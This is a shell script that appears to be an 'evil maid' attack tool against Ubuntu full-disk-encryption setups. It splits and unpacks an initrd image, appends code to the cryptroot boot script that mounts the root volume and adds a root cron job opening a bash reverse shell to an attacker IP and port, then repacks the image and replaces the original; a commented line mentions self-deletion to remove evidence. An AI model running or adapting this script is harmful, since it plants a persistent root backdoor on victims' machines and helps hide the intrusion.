#!/bin/sh

# DO NOT USE IF YOU ARE ON A REAL MACHINE, USE UNDER YOUR RISK !
# Only Modify the firt 4 variables in that order.

# Attacker Values and Information.

# Attacker Setup IP and Port
IP="192.168.0.111"
PORT=8005

# Veriify and paste the version after "initrd.img-" example: 5.1.3-9-generic
KERNEL_VERSION="#.#.#-#-generic"

# Install/Run BinWalk to find line where "...compressed data, from Unix,.." and replace Decimal value here
SPLIT_LOC=99999999


# ------------------ Constants do not change it !!! -----------------------------------------

# Define File and Sizes to use
FILE_NAME="initrd.img-$KERNEL_VERSION"
BLOCK_SIZE=512
let COUNT=$SPLIT_LOC/$BLOCK_SIZE

# Define Files names that will be use on the Script
NAME_MICRO="initrd.microcode"
NAME_IMAGE="image"

# Define Directory and Paths to work files previusly defined.
EVIL="evilmaid"
EXTRACT="extraction"
WORKING_PATH="/home/$USER/Desktop"
RETURN_PATH=$(pwd)


# Move inmediatly to the Working Path and Copy the File to Modify
cd "$WORKING_PATH/"
mkdir -p $EVIL
cp "$RETURN_PATH/$FILE_NAME" "$WORKING_PATH/$EVIL/$FILE_NAME"
cd "$EVIL/"


# Split the Kernel File in the right sizes to modify only the Configuration and Keep the microcode intact
dd if="$FILE_NAME" bs=$BLOCK_SIZE count=$COUNT of=$NAME_MICRO
dd if="$FILE_NAME" bs=$SPLIT_LOC skip=1 of=$NAME_IMAGE

# Create a directory to work the configuration files of Kernel
mkdir -p $EXTRACT
mv $NAME_IMAGE ./$EXTRACT/
cd $EXTRACT
zcat $NAME_IMAGE | cpio -id

# We remove the image file to avoid rencripting this file into the modificated kernel
rm $NAME_IMAGE

# Open the and Modify the file to inject the reverse shell
cd "scripts/local-top/"
sed -i '$ d' cryptroot

# Append reverse shell code into the kernel configuration
echo "
# backdoor
mount /dev/mapper/ubuntu--vg-root /tmp
echo -e \"*/1 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'\" >> /tmp/etc/crontab
umount /tmp

exit 0" >> cryptroot

# Returns to Working Path to regenerate the package that will replace the original one
cd "$WORKING_PATH/$EVIL/$EXTRACT"
find . | cpio -H newc -o | gzip -9 > package
mv package ../package
cd ..
cat $NAME_MICRO package > $FILE_NAME

# Replace the original kernel with the modificated one that we create
cp $FILE_NAME $RETURN_PATH/$FILE_NAME

# The idea was the scrip auto destroys itself to remove any evidence of the attack but we did not test this.
#rm $RRETURN_PATH/evilmaid.sh